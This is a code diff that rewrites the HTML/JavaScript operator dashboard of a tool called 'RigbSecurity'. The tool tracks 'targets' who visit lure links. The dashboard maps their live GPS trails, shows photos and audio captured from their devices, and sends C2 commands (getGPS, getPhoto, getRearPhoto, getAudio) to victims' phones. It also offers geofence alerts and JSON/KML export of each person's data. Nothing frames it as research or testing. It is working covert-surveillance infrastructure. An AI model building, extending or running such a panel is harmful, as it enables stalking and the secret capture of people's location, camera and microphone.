@@ -1,82 +1,483 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>RigbSecurity — Command Center</title>
-<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RigbSecurity — Dashboard v3</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 <style>
-*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Courier New',monospace;background:#0a0e17;color:#c0c8d8}
-.layout{display:grid;grid-template-columns:300px 1fr 340px;height:100vh}
-.panel{background:#0d1117;overflow-y:auto}
-.panel-l{border-right:1px solid #1a2233}.panel-r{border-left:1px solid #1a2233}
-.ph{padding:14px;border-bottom:1px solid #1a2233;position:sticky;top:0;background:#0d1117;z-index:10}
-.ph h1{font-size:13px;color:#58a6ff;letter-spacing:1px}
-.tc{padding:12px 14px;border-bottom:1px solid #111820;cursor:pointer}.tc:hover,.tc.active{background:#161b22}
-.tc .id{font-size:12px;color:#58a6ff;font-weight:bold}.tc .tpl{font-size:10px;color:#666;text-transform:uppercase}
-.tc .co{font-size:11px;color:#7ee787;margin-top:3px;font-family:'Courier New'}.tc .mt{font-size:10px;color:#444;margin-top:3px}
-.dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:5px;vertical-align:middle}
-.on{background:#7ee787;box-shadow:0 0 6px #7ee787}.off{background:#555}.stale{background:#d29922}
-.cbtn{display:block;width:calc(100% - 28px);margin:10px 14px;padding:9px;background:#238636;color:#fff;border:none;border-radius:6px;font-size:12px;cursor:pointer;font-family:'Courier New'}
-#map{width:100%;height:100%}
-.ov{position:absolute;top:10px;left:10px;z-index:1000;background:rgba(13,17,23,.9);border:1px solid #1a2233;border-radius:6px;padding:8px 12px}
-.ov .s{font-size:10px;color:#888;margin-bottom:3px}.ov .s span{color:#58a6ff;font-weight:bold}
-.ds{padding:12px 14px;border-bottom:1px solid #111820}.ds h3{font-size:10px;color:#555;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px}
-.dr{display:flex;justify-content:space-between;font-size:11px;margin-bottom:3px}.dr .l{color:#666}.dr .v{color:#c9d1d9}.dr .vg{color:#7ee787}
-.mg{display:grid;grid-template-columns:1fr 1fr 1fr;gap:3px;padding:0 14px 10px}
-.mg img{width:100%;aspect-ratio:1;object-fit:cover;border-radius:3px;cursor:pointer;border:1px solid #1a2233}
-.le{padding:6px 14px;font-size:10px;border-bottom:1px solid #0d1117}
-.le .c{color:#7ee787}.le .t{color:#555}
-.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.9);z-index:9999;justify-content:center;align-items:center;cursor:pointer}
-.modal.active{display:flex}.modal img{max-width:90%;max-height:90%;border-radius:8px}
-@media(max-width:900px){.layout{grid-template-columns:1fr;grid-template-rows:auto 50vh auto}}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0a0a0f; color: #e0e0e0; }
+
+/* LOGIN */
+#login-overlay {
+  position: fixed; inset: 0; background: #0a0a0f; z-index: 9999;
+  display: flex; align-items: center; justify-content: center;
+}
+#login-box {
+  background: #1a1a2e; padding: 40px; border-radius: 12px; border: 1px solid #333;
+  text-align: center; min-width: 320px;
+}
+#login-box h2 { color: #00ff88; margin-bottom: 20px; }
+#login-box input {
+  width: 100%; padding: 12px; background: #0a0a0f; border: 1px solid #444;
+  color: #fff; border-radius: 6px; font-size: 16px; margin-bottom: 12px;
+}
+#login-box button {
+  width: 100%; padding: 12px; background: #00ff88; color: #000; border: none;
+  border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer;
+}
+#login-box button:hover { background: #00cc6a; }
+#login-error { color: #ff4444; margin-top: 10px; display: none; }
+
+/* LAYOUT */
+.hidden { display: none !important; }
+#app { display: grid; grid-template-columns: 320px 1fr; height: 100vh; }
+#sidebar {
+  background: #111; border-right: 1px solid #222; overflow-y: auto; padding: 16px;
+}
+#main { display: flex; flex-direction: column; }
+#map { flex: 1; }
+#bottom-panel {
+  height: 200px; background: #111; border-top: 1px solid #222;
+  overflow-y: auto; padding: 12px;
+}
+
+/* SIDEBAR */
+.sidebar-header {
+  display: flex; align-items: center; justify-content: space-between;
+  margin-bottom: 16px;
+}
+.sidebar-header h3 { color: #00ff88; font-size: 14px; }
+#search-input {
+  width: 100%; padding: 8px 12px; background: #1a1a2e; border: 1px solid #333;
+  color: #fff; border-radius: 6px; margin-bottom: 12px; font-size: 13px;
+}
+.target-card {
+  background: #1a1a2e; border: 1px solid #333; border-radius: 8px;
+  padding: 12px; margin-bottom: 8px; cursor: pointer; transition: border-color 0.2s;
+}
+.target-card:hover, .target-card.active { border-color: #00ff88; }
+.target-name { font-weight: bold; color: #fff; font-size: 14px; }
+.target-meta { font-size: 11px; color: #888; margin-top: 4px; }
+.target-badge {
+  display: inline-block; font-size: 10px; padding: 2px 6px; border-radius: 4px;
+  background: #333; color: #aaa; margin-top: 4px;
+}
+.target-badge.online { background: #003d1a; color: #00ff88; }
+
+/* C2 BUTTONS */
+.c2-bar {
+  display: flex; gap: 4px; margin-top: 8px; flex-wrap: wrap;
+}
+.c2-btn {
+  padding: 4px 8px; font-size: 10px; border: 1px solid #444; background: #222;
+  color: #ccc; border-radius: 4px; cursor: pointer;
+}
+.c2-btn:hover { background: #333; border-color: #00ff88; color: #00ff88; }
+
+/* BOTTOM PANEL */
+#event-log { font-family: monospace; font-size: 12px; }
+.log-entry { padding: 2px 0; border-bottom: 1px solid #1a1a1a; }
+.log-gps { color: #00ff88; }
+.log-media { color: #ff88ff; }
+.log-c2 { color: #ffaa00; }
+.log-geofence { color: #ff4444; }
+
+/* EXPORT BAR */
+#export-bar {
+  display: flex; gap: 8px; padding: 8px 16px; background: #0d0d14; border-bottom: 1px solid #222;
+}
+.export-btn {
+  padding: 6px 12px; font-size: 12px; border: 1px solid #333; background: #1a1a2e;
+  color: #ccc; border-radius: 4px; cursor: pointer;
+}
+.export-btn:hover { border-color: #00ff88; color: #00ff88; }
+
+/* STATS */
+#stats-bar {
+  display: flex; gap: 16px; padding: 8px 16px; background: #0d0d14;
+  border-bottom: 1px solid #222; font-size: 12px; color: #888;
+}
+.stat-item span { color: #00ff88; font-weight: bold; }
 </style>
 </head>
 <body>
-<div class="layout">
-<div class="panel panel-l"><div class="ph"><h1>📡 RIGBSECURITY</h1><div id="cnt" style="font-size:10px;color:#555">Loading...</div></div><button class="cbtn" onclick="location.href='/api/create?template=generic'">+ New Link (API)</button><div id="tl"></div></div>
-<div style="position:relative"><div id="map"></div><div class="ov"><div class="s">Active: <span id="sA">0</span></div><div class="s">Locations: <span id="sL">0</span></div><div class="s">Photos: <span id="sP">0</span></div></div></div>
-<div class="panel panel-r"><div class="ph"><h2 id="dT" style="font-size:13px;color:#58a6ff">Select target</h2></div><div id="dC"><div class="ds"><p style="color:#555;font-size:11px;text-align:center;padding:30px 0">Click a target</p></div></div></div>
+
+<!-- LOGIN OVERLAY -->
+<div id="login-overlay">
+  <div id="login-box">
+    <h2>🔒 RigbSecurity</h2>
+    <input type="password" id="login-pw" placeholder="Dashboard Password" autofocus>
+    <button onclick="doLogin()">Authenticate</button>
+    <div id="login-error">Invalid password</div>
+  </div>
 </div>
-<div class="modal" id="im" onclick="this.classList.remove('active')"><img id="mi" src=""/></div>
+
+<!-- MAIN APP -->
+<div id="app" class="hidden">
+  <div id="sidebar">
+    <div class="sidebar-header">
+      <h3>🎯 TARGETS</h3>
+      <span id="target-count" style="color:#888;font-size:12px;">0</span>
+    </div>
+    <input type="text" id="search-input" placeholder="Search targets...">
+    <div id="target-list"></div>
+  </div>
+  <div id="main">
+    <div id="stats-bar">
+      <div class="stat-item">Targets: <span id="stat-targets">0</span></div>
+      <div class="stat-item">GPS Fixes: <span id="stat-gps">0</span></div>
+      <div class="stat-item">Photos: <span id="stat-photos">0</span></div>
+      <div class="stat-item">Audio: <span id="stat-audio">0</span></div>
+    </div>
+    <div id="export-bar">
+      <button class="export-btn" onclick="exportJSON()">📥 Export JSON</button>
+      <button class="export-btn" onclick="exportKML()">🗺️ Export KML</button>
+      <button class="export-btn" onclick="toggleHeatmap()">🔥 Heatmap</button>
+    </div>
+    <div id="map"></div>
+    <div id="bottom-panel">
+      <div id="event-log"></div>
+    </div>
+  </div>
+</div>
+
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script src="https://unpkg.com/leaflet.heat@0.2.0/dist/leaflet-heat.js"></script>
 <script>
-let D={},sel=null,markers={},paths={};
-const map=L.map('map',{center:[39.8,-98.5],zoom:4,attributionControl:false});
-L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',{maxZoom:19}).addTo(map);
-function ci(c,p){return L.divIcon({className:'',html:`<div style="width:12px;height:12px;background:${c};border-radius:50%;border:2px solid #fff;box-shadow:0 0 ${p?10:3}px ${c}"></div>`,iconSize:[12,12],iconAnchor:[6,6]})}
-function ago(t){const s=Math.floor((Date.now()-new Date(t).getTime())/1000);if(s<60)return s+'s';if(s<3600)return Math.floor(s/60)+'m';if(s<86400)return Math.floor(s/3600)+'h';return Math.floor(s/86400)+'d'}
-function gs(l){if(!l)return{c:'off',t:'No data'};const a=Date.now()-new Date(l.ts).getTime();if(a<120000)return{c:'on',t:'Live'};if(a<3600000)return{c:'stale',t:'Recent'};return{c:'off',t:'Offline'}}
+// ═══════════════════════════════════════════
+// AUTH
+// ═══════════════════════════════════════════
+let authToken = localStorage.getItem('rigb_token') || '';
 
-async function load(){try{const r=await fetch('/api/all-targets');D=await r.json();render();updateMap();stats()}catch(e){}}
-function render(){const el=document.getElementById('tl');const ids=Object.keys(D);document.getElementById('cnt').textContent=ids.length+' targets';
-if(!ids.length){el.innerHTML='<div style="padding:20px 14px;text-align:center;color:#555;font-size:11px">No targets</div>';return}
-el.innerHTML=ids.map(id=>{const t=D[id],ls=t.locations||[],la=ls[ls.length-1],s=gs(la);
-return`<div class="tc ${sel===id?'active':''}" onclick="pick('${id}')"><div><span class="dot ${s.c}"></span><span class="id">${t.tracking?.name||id}</span></div><div class="tpl">${t.tracking?.template||'?'} — ${s.t}</div>${la?`<div class="co">${la.lat?.toFixed(6)}, ${la.lon?.toFixed(6)}</div><div class="mt">±${la.acc?.toFixed(0)||'?'}m | ${ago(la.ts)} ago | ${ls.length} pts</div>`:'<div class="mt">No data</div>'}</div>`}).join('')}
+async function doLogin() {
+  const pw = document.getElementById('login-pw').value;
+  try {
+    const resp = await fetch('/api/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ password: pw })
+    });
+    const data = await resp.json();
+    if (resp.ok && data.token) {
+      authToken = data.token;
+      localStorage.setItem('rigb_token', authToken);
+      document.getElementById('login-overlay').classList.add('hidden');
+      document.getElementById('app').classList.remove('hidden');
+      initDashboard();
+    } else {
+      document.getElementById('login-error').style.display = 'block';
+    }
+  } catch (e) {
+    document.getElementById('login-error').style.display = 'block';
+  }
+}
 
-function updateMap(){Object.keys(D).forEach(id=>{const ls=D[id].locations||[];if(!ls.length)return;const la=ls[ls.length-1],s=gs(la),live=s.c==='on',c=live?'#7ee787':s.c==='stale'?'#d29922':'#555';
-if(markers[id])markers[id].setLatLng([la.lat,la.lon]).setIcon(ci(c,live));
-else{markers[id]=L.marker([la.lat,la.lon],{icon:ci(c,live)}).addTo(map);markers[id].on('click',()=>pick(id))}
-markers[id].bindPopup(`<b>${D[id].tracking?.name||id}</b><br>${la.lat.toFixed(6)},${la.lon.toFixed(6)}<br>±${la.acc?.toFixed(0)||'?'}m`);
-if(ls.length>1){const co=ls.map(l=>[l.lat,l.lon]);if(paths[id])paths[id].setLatLngs(co);else paths[id]=L.polyline(co,{color:c,weight:2,opacity:.6,dashArray:'5,8'}).addTo(map)}})}
+document.getElementById('login-pw').addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') doLogin();
+});
 
-function pick(id){sel=id;render();detail(id);const ls=D[id]?.locations||[];if(ls.length){const la=ls[ls.length-1];map.setView([la.lat,la.lon],15,{animate:true})}}
+// Auto-login if token cached
+if (authToken) {
+  fetch('/api/all-targets', { headers: { 'X-Auth-Token': authToken } })
+    .then(r => { if (r.ok) return r.json(); throw new Error(); })
+    .then(() => {
+      document.getElementById('login-overlay').classList.add('hidden');
+      document.getElementById('app').classList.remove('hidden');
+      initDashboard();
+    })
+    .catch(() => { localStorage.removeItem('rigb_token'); authToken = ''; });
+}
 
-function detail(id){const t=D[id];if(!t)return;const ls=t.locations||[],md=t.media||[],la=ls[ls.length-1],ph=md.filter(m=>m.type==='photo'),au=md.filter(m=>m.type==='audio'),s=gs(la),dv=t.device||{};
-document.getElementById('dT').innerHTML=`<span class="dot ${s.c}"></span>${t.tracking?.name||id} <span style="font-size:10px;color:#555">${t.tracking?.template||''}</span>`;
-let h='';
-h+=`<div class="ds"><h3>Info</h3><div class="dr"><span class="l">ID</span><span class="v">${id}</span></div><div class="dr"><span class="l">Template</span><span class="v">${t.tracking?.template||'?'}</span></div><div class="dr"><span class="l">Visits</span><span class="v">${t.tracking?.visits||0}</span></div><div class="dr"><span class="l">Data</span><span class="v">${ls.length} GPS, ${ph.length} photos, ${au.length} audio</span></div></div>`;
-if(la){h+=`<div class="ds"><h3>📍 GPS Position</h3><div class="dr"><span class="l">Lat</span><span class="v vg">${la.lat?.toFixed(6)}</span></div><div class="dr"><span class="l">Lon</span><span class="v vg">${la.lon?.toFixed(6)}</span></div><div class="dr"><span class="l">Accuracy</span><span class="v">${la.acc?.toFixed(1)||'?'}m</span></div><div class="dr"><span class="l">Speed</span><span class="v">${la.spd?(la.spd*2.237).toFixed(1)+' mph':'Still'}</span></div><div class="dr"><span class="l">Updated</span><span class="v">${ago(la.ts)} ago</span></div><div style="margin-top:6px"><a href="https://maps.google.com/?q=${la.lat},${la.lon}" target="_blank" style="color:#58a6ff;font-size:10px">Google Maps ↗</a></div></div>`}
-if(Object.keys(dv).length){const bt=dv.battery||{},nt=dv.network||{};h+=`<div class="ds"><h3>📱 Device</h3><div class="dr"><span class="l">Platform</span><span class="v">${dv.platform||'?'}</span></div><div class="dr"><span class="l">Battery</span><span class="v">${bt.level||'?'}% ${bt.charging?'⚡':''}</span></div><div class="dr"><span class="l">Network</span><span class="v">${nt.effectiveType||'?'}</span></div><div class="dr"><span class="l">Timezone</span><span class="v">${dv.timezone||'?'}</span></div></div>`}
-if(ph.length){h+=`<div class="ds"><h3>📸 Photos (${ph.length})</h3></div><div class="mg">${ph.slice(-9).map(p=>`<img src="/captures/${id}/${p.filename}" onclick="document.getElementById('mi').src=this.src;document.getElementById('im').classList.add('active')" title="${p.camera} — ${new Date(p.ts).toLocaleTimeString()}">`).join('')}</div>`}
-if(au.length){h+=`<div class="ds"><h3>🎙️ Audio (${au.length})</h3></div>${au.slice(-5).map(a=>`<div style="padding:4px 14px;display:flex;align-items:center;gap:6px"><audio controls preload="none" src="/captures/${id}/${a.filename}" style="height:26px;flex:1"></audio><span style="font-size:9px;color:#555">${new Date(a.ts).toLocaleTimeString()}</span></div>`).join('')}`}
-if(ls.length){h+=`<div class="ds"><h3>📋 History (last 15)</h3></div>${ls.slice(-15).reverse().map(l=>`<div class="le"><span class="c">${l.lat?.toFixed(6)}, ${l.lon?.toFixed(6)}</span> <span style="color:#d29922">±${l.acc?.toFixed(0)||'?'}m</span><br><span class="t">${new Date(l.ts).toLocaleString()}</span></div>`).join('')}`}
-document.getElementById('dC').innerHTML=h}
+// ═══════════════════════════════════════════
+// DASHBOARD STATE
+// ═══════════════════════════════════════════
+let map, markers = {}, polylines = {}, heatLayer = null;
+let allTargets = {};
+let selectedTid = null;
+let ws = null;
+let heatmapVisible = false;
 
-function stats(){const ids=Object.keys(D);let tl=0,tp=0,ac=0;ids.forEach(id=>{const ls=D[id].locations||[],md=D[id].media||[];tl+=ls.length;tp+=md.filter(m=>m.type==='photo').length;if(ls.length){const a=Date.now()-new Date(ls[ls.length-1].ts).getTime();if(a<120000)ac++}});
-document.getElementById('sA').textContent=ac;document.getElementById('sL').textContent=tl;document.getElementById('sP').textContent=tp}
+function initDashboard() {
+  initMap();
+  loadTargets();
+  connectWebSocket();
+  document.getElementById('search-input').addEventListener('input', renderTargetList);
+}
 
-load();setInterval(load,10000);
-try{const pr=location.protocol==='https:'?'wss:':'ws:';const ws=new WebSocket(pr+'//'+location.host+'/ws/dashboard');ws.onmessage=e=>{const d=JSON.parse(e.data);if(d.type==='gps'&&D[d.tid]){if(!D[d.tid].locations)D[d.tid].locations=[];D[d.tid].locations.push(d.entry);render();updateMap();stats();if(sel===d.tid)detail(d.tid)}if(d.type==='media'&&D[d.tid]){if(!D[d.tid].media)D[d.tid].media=[];D[d.tid].media.push(d.entry);if(sel===d.tid)detail(d.tid);stats()}if(d.type==='device'&&D[d.tid]){D[d.tid].device=d.data;if(sel===d.tid)detail(d.tid)}};ws.onclose=()=>setTimeout(()=>location.reload(),5000)}catch(e){}
+function initMap() {
+  map = L.map('map').setView([7.9465, -1.0232], 7); // Ghana center
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+    attribution: '© OpenStreetMap'
+  }).addTo(map);
+}
+
+async function loadTargets() {
+  try {
+    const resp = await fetch('/api/all-targets', { headers: { 'X-Auth-Token': authToken } });
+    allTargets = await resp.json();
+    renderTargetList();
+    updateStats();
+    plotAllTargets();
+  } catch (e) {}
+}
+
+// ═══════════════════════════════════════════
+// RENDER (XSS-SAFE)
+// ═══════════════════════════════════════════
+function escapeHtml(str) {
+  const div = document.createElement('div');
+  div.textContent = str || '';
+  return div.innerHTML;
+}
+
+function renderTargetList() {
+  const search = document.getElementById('search-input').value.toLowerCase();
+  const list = document.getElementById('target-list');
+  list.innerHTML = '';
+
+  const tids = Object.keys(allTargets).filter(tid => {
+    const t = allTargets[tid].tracking || {};
+    const name = (t.name || tid).toLowerCase();
+    return name.includes(search) || tid.includes(search);
+  });
+
+  document.getElementById('target-count').textContent = tids.length;
+
+  tids.forEach(tid => {
+    const t = allTargets[tid].tracking || {};
+    const locs = allTargets[tid].locations || [];
+    const media = allTargets[tid].media || [];
+    const lastLoc = locs[locs.length - 1];
+
+    const card = document.createElement('div');
+    card.className = 'target-card' + (tid === selectedTid ? ' active' : '');
+    card.onclick = () => selectTarget(tid);
+
+    card.innerHTML = `
+      <div class="target-name">${escapeHtml(t.name || tid)}</div>
+      <div class="target-meta">ID: ${escapeHtml(tid)} | Visits: ${t.visits || 0}</div>
+      <div class="target-meta">${locs.length} GPS | ${media.length} Media</div>
+      ${lastLoc ? `<div class="target-meta">Last: ${escapeHtml(lastLoc.ts || '')}</div>` : ''}
+      <span class="target-badge ${locs.length > 0 ? 'online' : ''}">${locs.length > 0 ? 'ACTIVE' : 'PENDING'}</span>
+      <div class="c2-bar">
+        <button class="c2-btn" onclick="event.stopPropagation();sendC2('${tid}','getGPS')">📍 GPS</button>
+        <button class="c2-btn" onclick="event.stopPropagation();sendC2('${tid}','getPhoto')">📸 Photo</button>
+        <button class="c2-btn" onclick="event.stopPropagation();sendC2('${tid}','getRearPhoto')">📷 Rear</button>
+        <button class="c2-btn" onclick="event.stopPropagation();sendC2('${tid}','getAudio')">🎙️ Audio</button>
+        <button class="c2-btn" onclick="event.stopPropagation();sendC2('${tid}','getLongAudio')">🎙️ 30s</button>
+        <button class="c2-btn" onclick="event.stopPropagation();deleteTarget('${tid}')">🗑️</button>
+      </div>
+    `;
+    list.appendChild(card);
+  });
+}
+
+function selectTarget(tid) {
+  selectedTid = tid;
+  renderTargetList();
+  const locs = allTargets[tid]?.locations || [];
+  if (locs.length > 0) {
+    const last = locs[locs.length - 1];
+    map.setView([last.lat, last.lon], 15);
+  }
+}
+
+// ═══════════════════════════════════════════
+// MAP PLOTTING
+// ═══════════════════════════════════════════
+function plotAllTargets() {
+  Object.keys(allTargets).forEach(tid => {
+    const locs = allTargets[tid].locations || [];
+    if (locs.length === 0) return;
+
+    const last = locs[locs.length - 1];
+
+    // Marker
+    if (markers[tid]) map.removeLayer(markers[tid]);
+    const name = escapeHtml(allTargets[tid].tracking?.name || tid);
+    markers[tid] = L.marker([last.lat, last.lon])
+      .addTo(map)
+      .bindPopup(`<b>${name}</b><br>Acc: ${last.acc}m<br>${last.ts}`);
+
+    // Polyline
+    if (polylines[tid]) map.removeLayer(polylines[tid]);
+    const coords = locs.filter(l => l.lat && l.lon).map(l => [l.lat, l.lon]);
+    if (coords.length > 1) {
+      polylines[tid] = L.polyline(coords, { color: '#00ff88', weight: 2, opacity: 0.7 }).addTo(map);
+    }
+  });
+
+  // Fit bounds
+  const allCoords = [];
+  Object.values(allTargets).forEach(t => {
+    (t.locations || []).forEach(l => { if (l.lat && l.lon) allCoords.push([l.lat, l.lon]); });
+  });
+  if (allCoords.length > 0) {
+    map.fitBounds(allCoords);
+  }
+}
+
+// ═══════════════════════════════════════════
+// HEATMAP
+// ═══════════════════════════════════════════
+function toggleHeatmap() {
+  if (heatmapVisible && heatLayer) {
+    map.removeLayer(heatLayer);
+    heatLayer = null;
+    heatmapVisible = false;
+    return;
+  }
+
+  const points = [];
+  Object.values(allTargets).forEach(t => {
+    (t.locations || []).forEach(l => {
+      if (l.lat && l.lon) points.push([l.lat, l.lon, 0.5]);
+    });
+  });
+
+  if (points.length > 0) {
+    heatLayer = L.heatLayer(points, { radius: 25, blur: 15, maxZoom: 17 }).addTo(map);
+    heatmapVisible = true;
+  }
+}
+
+// ═══════════════════════════════════════════
+// C2 COMMANDS
+// ═══════════════════════════════════════════
+async function sendC2(tid, cmd) {
+  try {
+    await fetch(`/api/command/${tid}`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-Auth-Token': authToken },
+      body: JSON.stringify({ command: cmd })
+    });
+    addLog(`[C2] Sent "${cmd}" to ${tid}`, 'c2');
+  } catch (e) {
+    addLog(`[C2] Failed to send "${cmd}"`, 'c2');
+  }
+}
+
+async function deleteTarget(tid) {
+  if (!confirm(`Delete target ${tid} and all data?`)) return;
+  try {
+    await fetch(`/api/delete/${tid}`, {
+      method: 'DELETE',
+      headers: { 'X-Auth-Token': authToken }
+    });
+    delete allTargets[tid];
+    if (markers[tid]) { map.removeLayer(markers[tid]); delete markers[tid]; }
+    if (polylines[tid]) { map.removeLayer(polylines[tid]); delete polylines[tid]; }
+    renderTargetList();
+    updateStats();
+  } catch (e) {}
+}
+
+// ═══════════════════════════════════════════
+// EXPORT
+// ═══════════════════════════════════════════
+function exportJSON() {
+  const tid = selectedTid;
+  if (!tid) { alert('Select a target first'); return; }
+  window.open(`/api/export/${tid}?token=${authToken}`, '_blank');
+}
+
+function exportKML() {
+  const tid = selectedTid;
+  if (!tid) { alert('Select a target first'); return; }
+  window.open(`/api/export/${tid}/kml?token=${authToken}`, '_blank');
+}
+
+// ═══════════════════════════════════════════
+// WEBSOCKET REAL-TIME
+// ═══════════════════════════════════════════
+function connectWebSocket() {
+  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+  ws = new WebSocket(`${proto}//${location.host}/ws/dashboard`);
+
+  ws.onmessage = (e) => {
+    try {
+      const data = JSON.parse(e.data);
+      handleEvent(data);
+    } catch (err) {}
+  };
+
+  ws.onclose = () => {
+    setTimeout(connectWebSocket, 3000);
+  };
+}
+
+function handleEvent(data) {
+  const tid = data.tid;
+
+  if (data.type === 'gps') {
+    if (!allTargets[tid]) allTargets[tid] = { tracking: { name: tid }, locations: [], media: [] };
+    allTargets[tid].locations.push(data.entry);
+    plotAllTargets();
+    renderTargetList();
+    updateStats();
+    addLog(`📍 [${escapeHtml(allTargets[tid].tracking?.name || tid)}] ${data.entry.lat}, ${data.entry.lon} (${data.entry.acc}m)`, 'gps');
+  }
+
+  if (data.type === 'media') {
+    if (!allTargets[tid]) allTargets[tid] = { tracking: { name: tid }, locations: [], media: [] };
+    allTargets[tid].media.push(data.entry);
+    renderTargetList();
+    updateStats();
+    addLog(`📸 [${escapeHtml(allTargets[tid].tracking?.name || tid)}] ${data.entry.type} (${data.entry.camera || ''})`, 'media');
+  }
+
+  if (data.type === 'visit') {
+    addLog(`👁️ [${tid}] Target visited page`, 'gps');
+    loadTargets();
+  }
+
+  if (data.type === 'geofence') {
+    const emoji = data.alert.type === 'enter' ? '🚨' : '🏃';
+    addLog(`${emoji} [${tid}] Geofence ${data.alert.type}: ${escapeHtml(data.alert.name)}`, 'geofence');
+  }
+
+  if (data.type === 'device') {
+    if (allTargets[tid]) allTargets[tid].device = data.data;
+  }
+
+  if (data.type === 'c2') {
+    addLog(`⚡ [${tid}] C2: ${data.cmd} — ${data.status}`, 'c2');
+  }
+}
+
+// ═══════════════════════════════════════════
+// EVENT LOG
+// ═══════════════════════════════════════════
+function addLog(msg, type = 'gps') {
+  const log = document.getElementById('event-log');
+  const entry = document.createElement('div');
+  entry.className = `log-entry log-${type}`;
+  const ts = new Date().toLocaleTimeString();
+  entry.textContent = `[${ts}] ${msg}`;
+  log.insertBefore(entry, log.firstChild);
+  // Keep max 200 entries
+  while (log.children.length > 200) log.removeChild(log.lastChild);
+}
+
+// ═══════════════════════════════════════════
+// STATS
+// ═══════════════════════════════════════════
+function updateStats() {
+  let totalGps = 0, totalPhotos = 0, totalAudio = 0;
+  Object.values(allTargets).forEach(t => {
+    totalGps += (t.locations || []).length;
+    (t.media || []).forEach(m => {
+      if (m.type === 'photo') totalPhotos++;
+      if (m.type === 'audio') totalAudio++;
+    });
+  });
+  document.getElementById('stat-targets').textContent = Object.keys(allTargets).length;
+  document.getElementById('stat-gps').textContent = totalGps;
+  document.getElementById('stat-photos').textContent = totalPhotos;
+  document.getElementById('stat-audio').textContent = totalAudio;
+}
 </script>
 </body>
 </html>
